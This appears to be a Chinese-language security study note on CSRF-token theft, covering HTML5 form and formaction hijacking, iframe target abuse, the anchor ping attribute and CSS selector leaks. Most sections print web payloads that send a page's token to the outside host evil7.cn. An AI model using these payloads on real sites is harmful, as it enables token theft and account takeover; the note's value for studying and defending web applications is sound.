## 阅读连接
https://xz.aliyun.com/t/7084
## cookie中的token
cookie属性设置为http-only，能有效避免xss攻击导致token泄漏。
但实际开发中，很少会设置此属性，因为不能用JS操作cookie，不利开发。
服务端现在较为安全的方法是通过对请求进行数字签名，然后返回给客户端进行有限期的token保存（不一定是保存在cookie）
https://www.zhihu.com/question/336386632
还可以阅读我之前写的《token和csrf》
## form表单中的token
```js
<form id="user-edit" method="POST" action="/user/edit">
  <input name="token" type="hidden" value="csrf-xxxx1234">
  <input name="notes" type="text" value="">
  <input name="secert" type="radio">secert
  <input name="public" type="radio">public
  <input type="submit" value="save">
</form>

<div>user's note blablabla...</div>
```
假设你在这个页面找到个DOM类型的self-xss，不过有这样的限制区别：

如果用户提交secert类别的内容，那页面将保留所有原始DOM，但限制仅能自己查看和触发，其他人看不到这条note的内容。
但如果你发布的public文本内容，文本则可以公开给所有人浏览，不过危险的event和用于危险的标签DOM全被waf过滤了。
```js
<input type="submit" form="user-edit" value="hijack">
```
文中利用了
input新的html5属性form(作用是规定输入字段所属的一个或多个表单)
虽然是用户编辑出来的一个input标签，但在其他用户点击的情况下，成功触发了他所在页面的正常表单。
尝试拿到token的伪造表达元素
```js
<input type="submit" form="user-edit" formaction="https://evil7.cn" formmethod="GET" value="hijack">
```
同样也可以作用于iframe
```js
<iframe name="title_frame" src="/index?token=xxxx1234"></iframe>
<form id="user-edit" method="POST" action="/user/edit">
  <input name="token" type="hidden" value="csrf-xxxx1234">
  <input name="notes" type="text" value="">
  <input name="secert" type="radio">secert
  <input name="public" type="radio">public
  <input type="submit" value="save">
</form>
<input type="submit" formtarget="title_frame" formaction="https://evil7.cn" formmethod="GET" value="hijack">
```
虽然a标签的行为可能被代理跳转或安全处理了no-referrer属性，但通过找到一个没有sandbox和其他安全限制的iframe来劫持为form的target，就成功绕过了URL带出token的referrer限制。
## url中的token
```js
<a href="https://evil7.cn">get_token</a>
```
但现在有安全意识的开发人员都普遍带上no-referrer属性
但html5又有一个新的ping属性可以利用。此属性用来统计点击或者跟踪行为，但实际上你也可以
用来盗取token。
ping属性在用户点击链接时，统计用户点击的内容发送到指定服务器，所以不管是否刷新跳转页面是否点击的是个锚点链接，只要有点击发生其实ping都是正常发出ping请求的，所以即使href中是个锚点不是链接，我们的server也能统计到用户点了什么（ping-from/ping-to）。同样，哪怕csp和waf做了一定的安全处理，让我们没法跨域情况实现获取到其他站点的ping-from： https://domain.com/token=csrfxxxx1234，我们也可以通过hash锚点，让链接指向实际为https://domain.com/token=csrfxxxx1234#hash的链接，hash不会破坏浏览器地址栏现有的链接，但我们完全可以在server上看到一条ping流量带出了ping-to属性，从而完成不破坏现有URL情况下，通过ping-to带出URL的内容
```js
<a href="#ping-leak" ping="https://evil7.cn">ping_leak</a>
```
搭配hash属性就可以向https://evil7.cn，发送https://domain.com/token=csrfxxxx1234#ping-leak，从而获取token
## css获取token
```js
<style>
input[name="token"][value^="c"] {
  background: url("https://evil7.cn/css-leak?token_1=c")
}
</style>

<input name="token" value="csrf-xxxx1234">
```
css4还使得css支持正则，所以作者大胆提出一种攻击手段
```js
# 泄露出token第1个字符
@document regexp("/token=a.*/") {
  div:nth-child(1) { background: url("https://evil7.cn/?token_1=a")}
}
@document regexp("/token=b.*/") {
  div:nth-child(1) { background: url("https://evil7.cn/?token_1=b")}
}
......
@document regexp("/token=z.*/") {
  div:nth-child(1) { background: url("https://evil7.cn/?token_1=z")}
}
......
# 泄露出token第2个字符
@document regexp("/token=.{2}a.*/") {
  div:nth-child(1) { background: url("https://evil7.cn/?token_2=a")}
}
@document regexp("/token=.{2}b.*/") {
  div:nth-child(1) { background: url("https://evil7.cn/?token_2=b")}
}
......
@document regexp("/token=.{2}z.*/") {
  div:nth-child(1) { background: url("https://evil7.cn/?token_2=z")}
}
......
# 泄露出token第3个字符
@document regexp("/token=.{3}a.*/") {
  div:nth-child(3) { background: url("https://evil7.cn/?token_3=a")}
}
......
```